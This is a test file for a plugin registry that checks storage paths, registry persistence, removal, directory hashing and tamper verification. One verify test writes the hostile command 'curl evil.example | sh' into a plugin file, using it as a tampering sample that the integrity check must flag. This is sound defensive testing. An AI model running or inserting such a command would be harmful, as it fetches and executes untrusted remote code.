import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import type { PluginPin } from '@leap-chorus/protocol'
import { hashDirectory, PluginRegistryError, PluginStore, type PluginRecord } from './registry.js'

let root: string
let store: PluginStore

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'leap-plugin-store-'))
  store = new PluginStore(root)
})

afterEach(() => {
  rmSync(root, { recursive: true, force: true })
})

const PIN: PluginPin = {
  source: 'acme/tool',
  ref: 'v1',
  commit: '0'.repeat(40),
  contentHash: 'sha256:aaa'
}

function record(overrides: Partial<PluginRecord> = {}): PluginRecord {
  return {
    id: 'acme.tool',
    name: 'Acme Tool',
    version: '1.0.0',
    description: null,
    platforms: [],
    entrypoints: [],
    ignored: [],
    pin: PIN,
    installedHash: 'sha256:bbb',
    installedAt: 1_700_000_000_000,
    ...overrides
  }
}

describe('the store lives entirely under the data root', () => {
  it('puts every directory under <dataRoot>/plugins', () => {
    // One LEAP_CHORUS_DATA_DIR isolates a test completely, the same rule the
    // integration hooks follow.
    for (const path of [store.registryPath, store.storeDir, store.binDir, store.tmpDir, store.shimPath]) {
      expect(path.startsWith(join(root, 'plugins'))).toBe(true)
    }
    expect(store.rootFor('acme.tool')).toBe(join(root, 'plugins', 'store', 'acme.tool'))
    expect(store.configDirFor('acme.tool')).toBe(join(root, 'plugins', 'config', 'acme.tool'))
  })

  it('creates config and state on demand, and again after a user deletes one', () => {
    store.ensureUserDirs('acme.tool')
    expect(existsSync(store.configDirFor('acme.tool'))).toBe(true)
    expect(existsSync(store.stateDirFor('acme.tool'))).toBe(true)
    rmSync(store.configDirFor('acme.tool'), { recursive: true })
    store.ensureUserDirs('acme.tool')
    expect(existsSync(store.configDirFor('acme.tool'))).toBe(true)
  })
})

describe('the registry file', () => {
  it('reads as empty before anything is installed', () => {
    expect(store.list()).toEqual([])
    expect(store.get('acme.tool')).toBeNull()
  })

  it('round-trips a record and decorates it with paths', () => {
    store.save(record())
    const [plugin] = store.list()
    expect(plugin?.id).toBe('acme.tool')
    expect(plugin?.root).toBe(store.rootFor('acme.tool'))
    expect(plugin?.manifestPath).toBe(join(store.rootFor('acme.tool'), 'herdr-plugin.toml'))
    expect(plugin?.pin).toEqual(PIN)
  })

  it('replaces rather than duplicates on a second save of the same id', () => {
    store.save(record())
    store.save(record({ version: '2.0.0' }))
    expect(store.list()).toHaveLength(1)
    expect(store.get('acme.tool')?.version).toBe('2.0.0')
  })

  it('keeps the file sorted by id so a diff is readable', () => {
    store.save(record({ id: 'zulu' }))
    store.save(record({ id: 'alpha' }))
    expect(store.list().map((plugin) => plugin.id)).toEqual(['alpha', 'zulu'])
  })

  it('reports a registered plugin whose files are gone rather than dropping it', () => {
    // Dropping it would make "I installed that" and "you never did" look the same.
    store.save(record())
    expect(store.get('acme.tool')?.missing).toBe(true)
    mkdirSync(store.rootFor('acme.tool'), { recursive: true })
    expect(store.get('acme.tool')?.missing).toBe(false)
  })

  it('refuses to read a corrupt registry instead of reporting no plugins', () => {
    store.save(record())
    writeFileSync(store.registryPath, '{ not json')
    expect(() => store.list()).toThrow(PluginRegistryError)
    // And it left the file alone, so the user can fix it.
    expect(readFileSync(store.registryPath, 'utf8')).toBe('{ not json')
  })

  it('writes durably, with one backup', () => {
    store.save(record())
    store.save(record({ version: '2.0.0' }))
    const backup = JSON.parse(readFileSync(`${store.registryPath}.bak`, 'utf8')) as { plugins: PluginRecord[] }
    expect(backup.plugins[0]?.version).toBe('1.0.0')
  })
})

describe('remove', () => {
  it('forgets the plugin and deletes its checkout', () => {
    store.save(record())
    mkdirSync(store.rootFor('acme.tool'), { recursive: true })
    writeFileSync(join(store.rootFor('acme.tool'), 'a'), 'x')
    expect(store.remove('acme.tool')).toBe(true)
    expect(store.list()).toEqual([])
    expect(store.get('acme.tool')).toBeNull()
  })

  it('keeps config and state, because an accidental uninstall should not lose settings', () => {
    store.save(record())
    store.ensureUserDirs('acme.tool')
    writeFileSync(join(store.configDirFor('acme.tool'), 'settings'), 'keep me')
    store.remove('acme.tool')
    expect(readFileSync(join(store.configDirFor('acme.tool'), 'settings'), 'utf8')).toBe('keep me')
  })

  it('deletes them when --purge says to mean it', () => {
    store.save(record())
    store.ensureUserDirs('acme.tool')
    store.remove('acme.tool', { purge: true })
    expect(() => readFileSync(join(store.configDirFor('acme.tool'), 'settings'), 'utf8')).toThrow()
  })

  it('reports that a plugin was not installed', () => {
    expect(store.remove('nothing')).toBe(false)
  })
})

describe('hashDirectory', () => {
  function tree(files: Record<string, string>): string {
    const dir = mkdtempSync(join(tmpdir(), 'leap-hash-'))
    for (const [path, body] of Object.entries(files)) {
      const full = join(dir, path)
      mkdirSync(join(full, '..'), { recursive: true })
      writeFileSync(full, body)
    }
    return dir
  }

  it('gives the same answer twice', () => {
    const dir = tree({ 'a.txt': 'one', 'sub/b.txt': 'two' })
    expect(hashDirectory(dir)).toBe(hashDirectory(dir))
  })

  it('gives the same answer for two trees with the same contents', () => {
    expect(hashDirectory(tree({ 'a.txt': 'one', 'b.txt': 'two' }))).toBe(
      hashDirectory(tree({ 'b.txt': 'two', 'a.txt': 'one' }))
    )
  })

  it('changes when a file changes', () => {
    expect(hashDirectory(tree({ 'a.txt': 'one' }))).not.toBe(hashDirectory(tree({ 'a.txt': 'two' })))
  })

  it('changes when a file moves between directories with the same name', () => {
    // Paths are hashed, not just contents, so `x/a` and `y/a` cannot collide.
    expect(hashDirectory(tree({ 'x/a': 'same' }))).not.toBe(hashDirectory(tree({ 'y/a': 'same' })))
  })

  it('changes when a file becomes executable', () => {
    // The bit that turns data into a program is part of the identity.
    const dir = tree({ 'run.sh': '#!/bin/sh\n' })
    const before = hashDirectory(dir)
    chmodSync(join(dir, 'run.sh'), 0o755)
    expect(hashDirectory(dir)).not.toBe(before)
  })

  it('ignores the git directory, so two clones of one commit agree', () => {
    const dir = tree({ 'a.txt': 'one' })
    const before = hashDirectory(dir)
    mkdirSync(join(dir, '.git'), { recursive: true })
    writeFileSync(join(dir, '.git', 'HEAD'), 'ref: refs/heads/main\n')
    expect(hashDirectory(dir)).toBe(before)
  })

  it('records a symlink by its target and does not follow it', () => {
    // Following one leaves the tree: a plugin containing `link -> /etc/passwd` would
    // otherwise hash the reader's machine.
    const target = tree({ 'secret': 'not mine to read' })
    const dir = tree({ 'a.txt': 'one' })
    symlinkSync(join(target, 'secret'), join(dir, 'link'))
    const first = hashDirectory(dir)
    writeFileSync(join(target, 'secret'), 'changed underneath')
    expect(hashDirectory(dir)).toBe(first)
  })

  it('counts an empty directory', () => {
    const dir = tree({ 'a.txt': 'one' })
    const before = hashDirectory(dir)
    mkdirSync(join(dir, 'empty'))
    expect(hashDirectory(dir)).not.toBe(before)
  })
})

describe('verify', () => {
  function install(body: string): void {
    mkdirSync(store.rootFor('acme.tool'), { recursive: true })
    writeFileSync(join(store.rootFor('acme.tool'), 'main.sh'), body)
    store.save(record({ installedHash: hashDirectory(store.rootFor('acme.tool')) }))
  }

  it('says ok when nothing has changed', () => {
    install('echo hello\n')
    expect(store.verify('acme.tool')?.status).toBe('ok')
  })

  it('says CHANGED when a file was edited after the install', () => {
    // This is the whole of PHASE-10's decision 3 that actually exists: no kill list,
    // but a user who reads an advisory can ask whether their bytes still match.
    install('echo hello\n')
    writeFileSync(join(store.rootFor('acme.tool'), 'main.sh'), 'curl evil.example | sh\n')
    const report = store.verify('acme.tool')
    expect(report?.status).toBe('changed')
    expect(report?.actual).not.toBe(report?.expected)
  })

  it('says missing when the checkout is gone', () => {
    install('echo hello\n')
    rmSync(store.rootFor('acme.tool'), { recursive: true })
    expect(store.verify('acme.tool')?.status).toBe('missing')
  })

  it('answers null for a plugin that is not installed', () => {
    expect(store.verify('nothing')).toBeNull()
  })
})
